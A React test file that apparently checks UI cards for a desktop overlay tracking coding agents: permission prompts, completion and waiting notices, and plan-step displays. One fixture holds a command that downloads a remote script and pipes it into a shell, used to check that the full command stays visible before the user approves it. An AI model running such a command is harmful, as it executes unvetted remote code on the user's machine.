// @vitest-environment jsdom
import { afterEach, describe, expect, it, vi } from "vitest";
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import type { AgentRow, PlanStep, SessionKey } from "../../lib/types";

const invoke = vi.fn(async () => undefined);
vi.mock("@tauri-apps/api/core", () => ({ invoke: (...a: unknown[]) => invoke(...(a as [])) }));

const { AgentCard, AgentList, agentHeight } = await import("./AgentCard");
const { useApp } = await import("../../lib/store");

afterEach(() => {
  cleanup();
  invoke.mockClear();
});

const key: SessionKey = { agent: "claude_code", id: "s1" };
const row: AgentRow = {
  key,
  agent: "claude_code",
  project: "shop",
  state: "done",
  plan: [],
  actions: ["Читает a.rs", "Правит billing.ts"],
  summary: "Исправил округление в billing.ts",
  seen: false,
};
const notch = { width: 179, height: 32 };
const title = () => document.querySelector("[data-agent-title]")?.textContent?.replace(/\s+/g, " ").trim();

describe("AgentCard", () => {
  it("nothing_drawn_above_notch_height", () => {
    const { container } = render(
      <AgentCard card={{ kind: "permission", id: 1, key, tool: "Bash", detail: "git push", can_always: true }} rows={[row]} notch={notch} />,
    );
    const panel = container.querySelector("[data-agent-panel]") as HTMLElement;
    expect(parseFloat(panel.style.top)).toBeGreaterThanOrEqual(notch.height + 12);
    const list = render(<AgentList rows={[row]} notch={{ width: 179, height: 60 }} />).container;
    expect(parseFloat((list.querySelector("[data-agent-panel]") as HTMLElement).style.top)).toBeGreaterThanOrEqual(72);
  });

  it("permission_buttons_send_choice", () => {
    render(<AgentCard card={{ kind: "permission", id: 7, key, tool: "Bash", detail: "git push origin main", can_always: true }} rows={[row]} notch={notch} />);
    expect(screen.getByText("git push origin main")).toBeTruthy();
    expect(title()).toBe("shop needs permission");
    fireEvent.click(screen.getByText("Always"));
    expect(invoke).toHaveBeenCalledWith("agent_permission", { id: 7, choice: "always" });
    fireEvent.click(screen.getByText("Deny"));
    expect(invoke).toHaveBeenCalledWith("agent_permission", { id: 7, choice: "deny" });
    fireEvent.click(screen.getByText("Allow"));
    expect(invoke).toHaveBeenCalledWith("agent_permission", { id: 7, choice: "allow" });
  });

  it("permission_card_shows_the_whole_command_and_the_rule", () => {
    // Review 2026-11-10: nothing the user allows may hide behind «…».
    const long = "git push origin main && curl https://example.com/install.sh | sh";
    render(<AgentCard card={{ kind: "permission", id: 7, key, tool: "Bash", detail: long, can_always: true, rule: "Bash(npm run:*)" }} rows={[row]} notch={notch} />);
    const detail = document.querySelector("[data-agent-detail]") as HTMLElement;
    expect(detail.textContent).toBe(long);
    expect(detail.style.whiteSpace).toBe("pre-wrap");
    expect(detail.style.textOverflow).not.toBe("ellipsis");
    expect(detail.style.overflowY).toBe("auto");
    expect(screen.getByText("Always allows: Bash(npm run:*)")).toBeTruthy();
  });

  it("always_hidden_without_suggestion", () => {
    render(<AgentCard card={{ kind: "permission", id: 7, key, tool: "Edit", detail: "billing.ts", can_always: false }} rows={[row]} notch={notch} />);
    expect(screen.queryByText("Always")).toBeNull();
    expect(screen.getByText("Allow")).toBeTruthy();
  });

  it("done_card_shows_summary_and_open", () => {
    render(<AgentCard card={{ kind: "done", key }} rows={[row]} notch={notch} />);
    expect(title()).toBe("shop Claude Code finished");
    expect(screen.getByText("Исправил округление в billing.ts")).toBeTruthy();
    fireEvent.click(screen.getByText("Open"));
    expect(invoke).toHaveBeenCalledWith("agent_open", { key });
    fireEvent.click(screen.getByText("OK"));
    expect(invoke).toHaveBeenCalledWith("agent_dismiss");
  });

  it("waiting_card_says_it_waits", () => {
    render(<AgentCard card={{ kind: "waiting", key }} rows={[{ ...row, state: "waiting" }]} notch={notch} />);
    expect(title()).toBe("shop Claude Code is waiting for you");
  });

  it("after_pause_card_counts", () => {
    render(<AgentCard card={{ kind: "after_pause", done: 2, waiting: 1 }} rows={[]} notch={notch} />);
    expect(screen.getByText("While paused: 2 finished, 1 waiting for you")).toBeTruthy();
    expect(screen.queryByText("OK")).toBeNull();
  });

  it("after_pause_line_speaks_russian_and_drops_zeros", () => {
    // Spec §3.5: «Пока была пауза: 2 агента закончили, 1 ждёт тебя».
    useApp.setState({ lang: "ru" });
    const line = (done: number, waiting: number) => {
      const { container, unmount } = render(<AgentCard card={{ kind: "after_pause", done, waiting }} rows={[]} notch={notch} />);
      const text = container.textContent;
      unmount();
      return text;
    };
    expect(line(2, 1)).toBe("Пока была пауза: 2 агента закончили, 1 ждёт тебя");
    expect(line(1, 0)).toBe("Пока была пауза: 1 агент закончил");
    expect(line(5, 3)).toBe("Пока была пауза: 5 агентов закончили, 3 ждут тебя");
    expect(line(0, 2)).toBe("Пока была пауза: 2 ждут тебя");
    useApp.setState({ lang: "en" });
  });

  it("the open island is tinted with the state's colour", () => {
    const { container } = render(<AgentCard card={{ kind: "done", key }} rows={[row]} notch={notch} />);
    // jsdom cannot parse a radial gradient: the colour is checked through the state it names.
    expect(container.querySelector("[data-agent-tint]")?.getAttribute("data-agent-tint")).toBe("done");
    cleanup();
    const p = render(<AgentCard card={{ kind: "permission", id: 1, key, tool: "Bash", detail: "x", can_always: false }} rows={[row]} notch={notch} />);
    expect(p.container.querySelector("[data-agent-tint]")?.getAttribute("data-agent-tint")).toBe("waiting");
  });

  it("there is no grey field any more: the text sits right of the big Drop", () => {
    const { container } = render(<AgentCard card={{ kind: "done", key }} rows={[row]} notch={notch} />);
    const panel = container.querySelector("[data-agent-panel]") as HTMLElement;
    expect(panel.style.background).toBe("");
    expect(parseFloat(panel.style.left)).toBeGreaterThanOrEqual(24 + 44);
  });

  it("an empty list says the agents are free", () => {
    render(<AgentList rows={[]} notch={notch} />);
    expect(screen.getByText("All agents are free")).toBeTruthy();
  });

  it("list_rows_show_step_and_actions_and_open", () => {
    render(<AgentList rows={[{ ...row, state: "working" }]} notch={notch} />);
    // No plan: no step in the title (spec 2026-11-13 §3.2 п. 4).
    expect(title()).toBe("shop Claude Code");
    // The older action done (✓, past tense), the newest one going on (›).
    expect(screen.getByText("Прочитал a.rs")).toBeTruthy();
    expect(screen.getByText("Правит billing.ts")).toBeTruthy();
    fireEvent.click(screen.getByText("shop"));
    expect(invoke).toHaveBeenCalledWith("agent_open", { key });
  });

  it("ladder_shows_prev_current_next", () => {
    render(<AgentList rows={[planRow("ddapp")]} notch={notch} />);
    expect(title()).toBe("shop Claude Code · 3 of 5");
    expect(step("prev")).toBe("✓ s2");
    expect(step("current")).toBe("› s3 · reading event.rs");
    expect(step("next")).toBe("s4");
  });

  it("ladder_first_and_last_step", () => {
    render(<AgentList rows={[planRow("app")]} notch={notch} />);
    expect(step("prev")).toBeUndefined();
    expect(step("next")).toBe("s2");
    cleanup();
    render(<AgentList rows={[planRow("dda", { actions: [] })]} notch={notch} />);
    expect(step("next")).toBeUndefined();
    expect(step("current")).toBe("› s3");
  });

  it("ladder_all_done_is_one_line", () => {
    render(<AgentList rows={[planRow("ddd")]} notch={notch} />);
    expect(title()).toBe("shop Claude Code");
    expect(document.querySelectorAll("[data-agent-step]").length).toBe(1);
    expect(step("all-done")).toBe("✓ All 3 steps done");
  });

  it("other_agents_get_one_line", () => {
    render(<AgentList rows={[planRow("ap"), planRow("dap", { key: { agent: "claude_code", id: "s2" }, project: "web" })]} notch={notch} />);
    const second = document.querySelectorAll("[data-agent-row]")[1] as HTMLElement;
    expect(second.textContent?.replace(/\s+/g, " ").trim()).toBe("web · 2 of 3 · s2");
    expect(second.querySelectorAll("[data-agent-step]").length).toBe(0);
  });

  it("ladder_height_matches_lines", () => {
    const n = { width: 179, height: 32 };
    const base = agentHeight({ rows: [planRow("ap")] }, n); // current + next
    expect(agentHeight({ rows: [planRow("dap")] }, n)).toBe(base + 16); // + prev
    expect(agentHeight({ rows: [planRow("dap"), planRow("ap", { key: { agent: "claude_code", id: "s2" } })] }, n)).toBe(base + 16 + 18 + 6);
  });

  it("step_title_wins_the_line_over_the_action", () => {
    // The user 2026-11-13: a long command cut the step title early («Сборка и живая п…»); the title
    // keeps up to 70 % of the line and the action gives way first.
    render(<AgentList rows={[planRow("ap")]} notch={notch} />);
    const [title, action] = Array.from(document.querySelector('[data-agent-step="current"]')!.children) as HTMLElement[];
    expect(title.style.flex).toBe("0 0 auto");
    expect(title.style.maxWidth).toBe("70%");
    expect(action.style.flex).toBe("0 1 auto");
    expect(action.style.minWidth).toBe("0px");
  });

  it("current_step_stays_one_line", () => {
    render(<AgentList rows={[planRow("ap", { plan: [{ title: "x".repeat(300), status: "active" }] })]} notch={notch} />);
    expect((document.querySelector('[data-agent-step="current"]') as HTMLElement).style.whiteSpace).toBe("nowrap");
  });
});

/** «ddap» → done, done, active, pending; titles s1…sN. */
const P = (s: string): PlanStep[] =>
  s.split("").map((c, i) => ({ title: `s${i + 1}`, status: ({ d: "done", a: "active", p: "pending" } as const)[c as "d" | "a" | "p"] }));
const planRow = (s: string, over: Partial<AgentRow> = {}): AgentRow => ({ ...row, state: "working", plan: P(s), actions: ["Reading event.rs"], ...over });
const step = (k: string) => document.querySelector(`[data-agent-step="${k}"]`)?.textContent?.replace(/\s+/g, " ").trim();
